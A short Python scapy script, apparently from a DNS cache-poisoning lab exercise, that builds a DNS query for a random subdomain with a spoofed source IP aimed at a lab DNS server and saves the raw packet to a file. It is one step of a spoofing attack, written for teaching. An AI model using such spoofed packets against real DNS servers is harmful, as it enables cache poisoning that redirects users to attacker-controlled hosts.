# The creation of the scapy packet to be sent to the DNS server taken from here: https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html the scapy documentation and the lab instructions

#!/usr/bin/python3
from scapy.all import *

name = 'twysw.example.com' # The name of the domain we are trying to mimic, with Random subdomain, to avoid cache

Qdsec    = DNSQR(qname=name) 

# DNS Question Record
# id - The id of the DNS packet, qr - Query Response, qdcount - Number of questions, qd - The question section
dns   = DNS(id=0xAAAA, qr=0, qdcount=1, qd=Qdsec)

# src - A randomized IP address spoffed by the Attacker, dst - The destination IP address, the Address of the DNS server
ip  = IP(src='1.2.3.4',dst='10.9.0.53')


# sport - The source port from the attacker, dport - The destination port, the port of the DNS server
udp = UDP(sport=12345, dport=53,chksum=0)


pkt = ip/udp/dns

# Save the packet data to a file
with open('ip_req.bin', 'wb') as f:
  f.write(bytes(pkt))
print(pkt.show())

